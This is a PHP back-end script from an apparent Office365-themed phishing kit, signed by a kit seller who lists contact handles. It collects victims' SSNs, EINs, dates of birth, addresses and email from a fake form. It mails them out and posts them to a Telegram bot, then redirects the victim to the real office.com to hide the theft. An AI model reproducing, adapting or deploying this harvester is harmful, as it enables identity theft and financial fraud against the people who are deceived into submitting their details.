<?php include 'send.php';?>
<?php

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office365 - ReZulT------------------\n";
$message .= "BusinessName : ".$_POST['BusinessName']."\n";
$message .= "BusinessOwner: ".$_POST['BusinessOwner']."\n";
$message .= "EIN: ".$_POST['EIN']."\n";
$message .= "SSN: ".$_POST['SSN']."\n";
$message .= "Date Of Birth: ".$_POST['DOB']."\n";
$message .= "OwnerAddress: ".$_POST['OwnerAddress']."\n";
$message .= "HomeAddress: ".$_POST['HomeAddress']."\n\n";
$message .= "IP Info: https://geoiptool.com/en/?ip=".$ip."\n";
$message .= "----------- -By 3rr0r Hun73r - ICQ:746979851----------\n";

$subject = "Account Details 😈 INFO FROM 😈- $ip";
$headers = "Office365 Logs->5<--";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "\n";
	 mail("", "3rr0r Hun73r ReZulT ", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
$website="https://api.telegram.org/bot-------------------------------";
$chatId=;
$params=[
    'chat_id'=>'',
   'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

		   header("Location: https://www.office.com/");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

/*
<!--
 _____                   ____                                               
 |  __ \                 |  _ \                                              
 | |__) |_ _  __ _  ___  | |_) |_   _                                        
 |  ___/ _` |/ _` |/ _ \ |  _ <| | | |                                       
 | |  | (_| | (_| |  __/ | |_) | |_| |                                       
 |_|   \__,_|\__, |\___| |____/ \__, |                                       
              __/ |              __/ |                                       
            _|___/           ___|___/    _    _            ______ ____       
           |___ \           / _ \       | |  | |          |____  |___ \      
             __) |_ __ _ __| | | |_ __  | |__| |_   _ _ __    / /  __) |_ __ 
            |__ <| '__| '__| | | | '__| |  __  | | | | '_ \  / /  |__ <| '__|
            ___) | |  | |  | |_| | |    | |  | | |_| | | | |/ /   ___) | |   
           |____/|_|  |_|   \___/|_|    |_|  |_|\__,_|_| |_/_/   |____/|_|   
                                                                             
					 #							       #
                    # ✔ 𝐈𝐂𝐐: 746979851 𝒐𝒓 @alsakib945   #
                   #     ✔  𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦: @alsakib945        #
				   #    ✔ hridoykhan3rr0r@hotmail.com   #
				   #     ✔   fb.com/error.hunter        #
				    #          -𝐂𝐨𝐧𝐭𝐚𝐜𝐭 𝐌𝐞 𝐇𝐞𝐫𝐞-          #
                  |#|====================================|#|  
			    𝐂𝐨𝐩𝐲𝐫𝐢𝐠𝐡𝐭 𝟚𝟘𝟚𝟘-𝟚𝟘𝟚𝟛---𝐀𝐥𝐥 𝐫𝐢𝐠𝐡𝐭𝐬 𝐑𝐞𝐬𝐞𝐫𝐯𝐞𝐝!
			ɪғ ʏᴏᴜ sᴇᴇ ᴀɴʏ ᴘʀᴏʙʟᴇᴍ ɪɴ ᴘᴀɢᴇ, ᴄᴏɴᴛᴀᴄᴛ ᴡɪᴛʜ ᴍᴇ!
//-----------------------------||--||-----------------------------\\
-->
*/
?>
